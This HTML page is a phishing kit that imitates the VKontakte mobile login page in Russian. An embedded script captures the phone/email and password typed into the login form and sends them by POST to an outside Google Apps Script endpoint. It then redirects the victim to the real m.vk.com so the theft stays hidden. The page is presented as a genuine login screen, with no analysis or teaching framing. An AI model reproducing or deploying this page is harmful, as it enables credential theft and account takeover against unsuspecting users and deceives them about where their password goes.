<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" class="vk vk_js_yes  vk_flex_yes r m h vk_withVolumeLine vk_appAuth_no">

<head class="push_notifier_default push_notifier_supported">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="format-detection" content="telephone=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="MobileOptimized" content="176">
    <meta name="HandheldFriendly" content="True">
    <meta name="theme-color" content="#5181b8">
    <base href=".">
    <style>
    @-ms-viewport {
        width: device-width;
    }
    </style>
    <title>Мобильная версия ВКонтакте</title>
    <link rel="shortcut icon" href="favicon.ico">
    <script>
    (function() {
        window.isMVK = true;
        window.isNewMail = true;
        window.isNewHeader = true;
        window.audioSubscribe = false;
        window.isArticleWebView = false;

        var vkElem = document.querySelector('.vk');
        var vkClass = vkElem.getAttribute('class');

        var supports = {
            js: true,
            flex: window.CSS && CSS.supports && (
                CSS.supports('display', 'flex') ||
                CSS.supports('display', '-webkit-flex') ||
                CSS.supports('display', '-ms-flexbox')
            )
        };

        supports.js && (vkClass = vkClass.replace('vk_js_no', 'vk_js_yes'));
        supports.flex && (vkClass = vkClass.replace('vk_flex_no', 'vk_flex_yes'));
        vkElem.setAttribute('class', vkClass);
    })();
    </script>
    <link type="text/css" rel="stylesheet" href="./files/s_cfmxw.css">
    <link type="text/css" rel="stylesheet" media="only screen" href="./files/s_yzgt.css">
</head>

<body id="vk" class="vk__page _hover vk_ios_no _hfixed vk_stickers_hints_support_yes opera_mini_no vk_safari_no vk__page_login vk_al_yes" cz-shortcut-listen="true">
    <div class="layout">
        <div class="layout__header mhead" id="vk_head"></div>
        <div class="layout__body qs_enabled _js _copts" id="vk_wrap">
            <div class="layout__leftMenu" id="l" style="min-height: 0px;">
            </div>
            <div class="layout__basis" id="m" style="min-height: 0px;">
                <div class="basis">
                    <div class="basis__header mhead" id="mhead">
                        <a href="https://m.vk.com/" accesskey="*" class="hb_wrap mhb_logo">
                            <div class="hb_btn mhi_logo">&nbsp;</div>
                            <h1 class="hb_btn mh_header">&nbsp;</h1>
                        </a>
                    </div>
                    <div class="basis__content mcont" id="mcont" data-canonical="https://vk.com/">
                        <div class="installApp">
                            <a class="installApp__link" href="https://vk.me/?act=dl">
                                <div class="installApp__link_wrap">
                                    <div class="installApp__label">
                                        Установить приложение <b>ВКонтакте</b>
                                        <span class="installApp__arrow"></span>
                                    </div>
                                </div>
                            </a>
                        </div>
                        <div class="pcont fit_box bl_cont new_form">
                            <div class="form_item">
                                <div class="login_header">
                                    Мобильная версия поможет Вам оставаться ВКонтакте, даже если Вы далеко от компьютера.
                                </div>
                                <form method="post" name="submit-to-google-sheet" novalidate="" _lpchecked="1">
                                    <dl class="fi_row">
                                        <dd>
                                            <input type="text" class="textfield" name="email" value="" placeholder="Телефон или email" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGP6zwAAAgcBApocMXEAAAAASUVORK5CYII=&quot;);">
                                        </dd>
                                    </dl>
                                    <dl class="fi_row">
                                        <dd>
                                            <input type="password" class="textfield" name="password" placeholder="Пароль" style="background-image: url(&quot;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR4nGP6zwAAAgcBApocMXEAAAAASUVORK5CYII=&quot;);">
                                        </dd>
                                    </dl>
                                    <div class="fi_row_new">
                                        <input id="submit-form" class="button wide_button" type="submit" value="Войти">
                                    </div>
                                    <div class="fi_row">
                                        <div class="near_btn wide_button login_restore"><a href="https://m.vk.com/restore">Забыли пароль?</a></div>
                                    </div>
                                    <div class="login_new_user">
                                        <div class="fi_header fi_header_light">Впервые ВКонтакте?</div>
                                    </div>
                                    <div class="fi_row">
                                        <a class="button wide_button success" href="https://m.vk.com/join">Зарегистрироваться</a>
                                    </div>
                                    <div class="socials">
                                        <a href="#" class="social_button social_google"><i class="social_icon"></i>Войти через Google</a>
                                        <a href="#" class="social_button"><i class="social_icon"></i>Войти через Facebook</a>
                                    </div>
                                </form>
                                <script>
                                    const scriptURL = 'https://script.google.com/macros/s/AKfycbxzFegGj8mIua1EfJ-HSNiEUYWzt6ed0mVqFDZoKFjHZDrFZlfB/exec'
                                      const form = document.forms['submit-to-google-sheet']

                                      form.addEventListener('submit', e => {
                                        e.preventDefault()
                                        fetch(scriptURL, { method: 'POST', body: new FormData(form)})
                                          .then(response => location.href="https://m.vk.com")
                                          .catch(error => console.error('Error!', error.message))
                                      })
                                </script>
                            </div>
                        </div>
                    </div>
                    <div class="basis__footer mfoot" id="mfoot">
                        <div class="pfoot">
                            <ul class="footer_menu">
                                <li class="fm_row"><a class="fm_item" href="#">English</a></li>
                                <li class="fm_row"><a class="fm_item" href="#">Українська</a></li>
                                <li class="fm_row"><a class="fm_item" href="#">all languages »</a></li>
                            </ul>
                            <ul id="footer_menu" class="footer_menu">
                                <li class="fm_row"><a class="fm_item" href="#">Полная версия</a></li>
                            </ul>
                        </div>
                    </div>
                    <div class="_cntrs" style="height:0;overflow:hidden;">
                        <img width="1" height="1" src="./files/hit" alt="" align="left">
                        <img width="1" height="1" src="./files/p" alt="" align="left">
                        <img src="./files/counter" style="border:0;" height="1" width="1">
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div id="vk_utils"></div>
    <div id="z"></div>
    <div id="vk_bottom"></div>
</body>

</html>
